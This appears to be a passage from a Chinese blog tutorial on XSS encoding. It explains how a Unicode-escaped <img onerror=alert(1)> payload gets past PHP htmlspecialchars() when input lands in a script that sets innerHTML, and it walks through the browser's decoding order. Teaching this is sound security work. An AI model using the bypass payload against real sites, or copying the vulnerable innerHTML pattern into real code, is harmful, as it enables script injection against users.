<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;Your name is:</span></span><br><span class="line"><span class="string">		 &lt;div id=&#x27;a&#x27;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		 &lt;script&gt;</span></span><br><span class="line"><span class="string">		 	document.getElementById(&#x27;a&#x27;).innerHTML=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.htmlspecialchars(<span class="variable">$value</span>).<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		 &lt;/script&gt;</span></span><br><span class="line"><span class="string">		 &quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br></pre></td></tr></table></figure>
<p>这里后端使用了<code>htmlspecialchars()</code>函数对输入的参数进行了HTML实体编码，目的是想让我们输入的标签变成普通的文本字符串，一般情况下是无法绕过的，但是这里后端把参数放在了<code>&lt;script&gt;</code>标签里面，并且操作DOM修改了外部的DOM节点，这就让我们有了可乘之机。可以使用JS编码进行绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> #源码</span><br><span class="line"></span><br><span class="line">\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e		#JS编码后</span><br></pre></td></tr></table></figure>
<p>这里浏览器接收到的数据是</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签语法，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以会先进行JS解码，解码之后就还原出了原来的<code>&lt;img&gt;</code>标签，浏览器发现是完整机构的HTML标签，于是就再创建DOM节点，然后对<code>onerror</code>事件的值进行HTML解码，最后执行<code>onerror</code>里面的JavaScript语句。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/flycat-2016/p/6507543.html" >XSS编码与绕过<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://saucer-man.com/information_security/103.html" >探索XSS利用编码绕过的原理<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://0verwatch.top/xss-encodeorder.html" >xss编码绕过原理以及从中学习到的几个例子<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>Post title：XSS编码剖析</li>
        <li>Post author：John_Frod</li>
        <li>Create time：2021-03-13 10:52:40</li>
        <li>
            Post link：https://keep.xpoet.cn/2021/03/13/XSS编码剖析/
        </li>
        <li>
            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
        </li>
    </ul>
</div>

            </div>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/03/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
                        >
                            <span class="left arrow-icon flex-center" >
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">同源策略</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/03/10/XSS%E6%8C%91%E6%88%98%E8%B5%9B/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">XSS 挑战赛</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center" >
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                    
                </main>

            </div>

            <div class="page-main-content-bottom">
                <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span> -
            
            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
        </div>
        
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
        </div>
    </div>
</footer>

            </div>
        </div>
    </main>

    <div class="sidebar-tools">
        <div class="tools-container">
    <ul class="tools-list">
        
            <li class="search popup-trigger">
                <i class="fas fa-search"></i>
            </li>
        

        

        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

    </ul>
</div>

    </div>

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">

    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-top flex-center">
            <i class="fas fa-arrow-up"></i>
        </li>

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="tools-ul-1">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

    </ul>
</div>

    </div>

    <!-- page aside -->
    <aside class="page-aside">
        
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E7%BC%96%E7%A0%81%E5%89%96%E6%9E%90"><span class="nav-text">XSS编码剖析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%93%8D%E5%BA%94%E8%BF%87%E7%A8%8B"><span class="nav-text">浏览器响应过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81"><span class="nav-text">常用编码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#URL%E7%BC%96%E7%A0%81"><span class="nav-text">URL编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML%E7%BC%96%E7%A0%81"><span class="nav-text">HTML编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaScript%E8%A7%A3%E7%A0%81%EF%BC%88Unicode%EF%BC%89"><span class="nav-text">JavaScript解码（Unicode）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E7%BC%96%E7%A0%81%E5%AE%9E%E8%B7%B5"><span class="nav-text">XSS编码实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%80"><span class="nav-text">案例一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C"><span class="nav-text">案例二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%89"><span class="nav-text">案例三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="nav-text">XSS编码绕过原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8HTML%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">利用HTML编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8JS%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">利用JS编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
    </div>
</div>
        
    </aside>

    <!-- image viewer -->
    <div class="image-viewer-container">
    <div class="img-box">
        <img src="">
    </div>
</div>


</div>



    <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-icon">
            <i class="fas fa-search"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>

    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
    

    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
    


</body>
</html>